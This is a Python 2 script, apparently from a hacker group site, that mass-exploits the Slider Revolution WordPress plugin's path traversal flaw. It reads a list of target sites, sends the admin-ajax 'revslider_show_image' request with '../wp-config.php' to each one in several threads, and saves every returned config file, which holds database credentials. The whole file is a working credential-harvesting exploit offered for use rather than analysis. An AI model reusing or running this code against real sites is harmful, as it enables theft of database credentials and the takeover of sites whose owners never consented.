#!/usr/bin/env python
#coding:utf-8
# Author:  DarkR4y | www.blackh4t.org
# Purpose: 
# Some code copy from - http://kendyhikaru.blogspot.com/2012/10/python-multithread-to-read-one-file.html
# Vuln detail - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
import os,sys
import urllib,urllib2
import re
import thread,threading,Queue
import urlparse
import logging
import time
#为了解决异常
import socket
import httplib

logfile = 'log.txt'
logger = logging.getLogger()
hdlr = logging.FileHandler(logfile)
formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
hdlr.setFormatter(formatter)
logger.addHandler(hdlr)
logger.setLevel(logging.NOTSET)        

savepath = os.getcwd() + os.path.sep + 'rs' + os.path.sep
payload = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
#Number of threads
n_thread = 5
#Create queue
queue = Queue.Queue()

class ThreadProcess(threading.Thread):
        def __init__(self, queue):
                threading.Thread.__init__(self)
                self.queue = queue
        
        def exp(self,url,name):
                print "Exploiting - %s" % url
                try:
                        f = urllib2.urlopen(url, timeout=5).read()
                        if (f[:2] == "<?"):
                                with open(name, "wb") as code:
                                        code.write(f)                
                        else:                
                                logger.info(url + " has no vuln")
                                #print url + " has no vuln!"
                                pass
                except httplib.BadStatusLine,e:
                        logger.error("[%s] %s",url,e)
                except socket.error, e:
                        logger.error("[%s] %s",url,e)
                        #print "Therer was an error: %s" % e
                except urllib2.URLError, e:  
                        logger.error("[%s] %s", url,e.reason)
                        #print "Therer was an error: %s" % e.reason
                
        def run(self):
                while True:
                        #Get from queue job
                        host = self.queue.get()
                        if host:
                                line = host.strip()
                                line = line.strip('\n')
                                site = urlparse.urlparse(line)
                                name= savepath + site.hostname + '__wp_config.txt'
                                path = line + payload
                                self.exp(path,name)                        
                        #print self.getName() + ":" + host
                        self.queue.task_done()
                


    
if __name__ == '__main__':
        if os.path.exists(savepath) == False:
                os.makedirs( savepath, mode=0777)    
        start = time.time()

        #Create number process
        for i in range(n_thread):
                t = ThreadProcess(queue)
                t.setDaemon(True)
                t.start()        
        #url list
        fr = open('url.txt','r')
        for line in fr:
                queue.put(line)                
        queue.join()                
        fr.close()
        end = time.time()
        print "It takes about - %.2fs" % (end-start)    
    
    
    
   
    
    
